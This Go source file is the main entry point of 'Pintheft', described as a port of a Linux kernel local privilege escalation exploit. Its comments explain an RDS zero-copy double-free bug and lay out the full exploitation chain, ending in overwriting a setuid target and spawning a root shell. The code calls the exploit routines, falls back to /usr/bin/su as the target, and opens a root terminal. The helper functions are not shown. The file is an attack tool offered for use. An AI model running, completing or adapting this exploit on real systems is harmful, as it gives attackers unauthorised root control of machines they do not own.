package main

// Pintheft - Go port of the RDS zcopy double-free LPE.
//
// Bug: rds_message_zcopy_from_user() GUP-pins pages one at a time.
// On fault, the error path put_page()s already-pinned pages, then
// rds_message_purge() __free_page()s them again -> silent refcount steal.
//
// Chain: REGISTER_BUFFERS(+1024) -> CLONE_BUFFERS(imu->refs=2) ->
// daemon holds clone -> steal 1024 refs -> evict page cache ->
// drain PCP -> munmap(free) -> pread(reclaim) -> READ_FIXED(overwrite) ->
// verify -> exec -> root

import (
	"fmt"
	"os"
	"syscall"
)

func main() {
	if os.Getuid() == 0 {
		syscall.Exec("/bin/bash", []string{"bash"}, os.Environ())
		os.Exit(1)
	}

	ok, daemons := runLPE()

	// kill daemons on failure
	if !ok {
		for _, pid := range daemons {
			syscall.Kill(pid, syscall.SIGKILL)
			syscall.Wait4(pid, nil, 0, nil)
		}
		fmt.Fprintln(os.Stderr, "pintheft-go: failed")
		os.Exit(1)
	}

	target := findSuidTarget()
	if target == "" {
		target = "/usr/bin/su"
	}

	if err := runRootPTY(target); err != nil {
		fmt.Fprintf(os.Stderr, "PTY error: %v\n", err)
		os.Exit(1)
	}
}
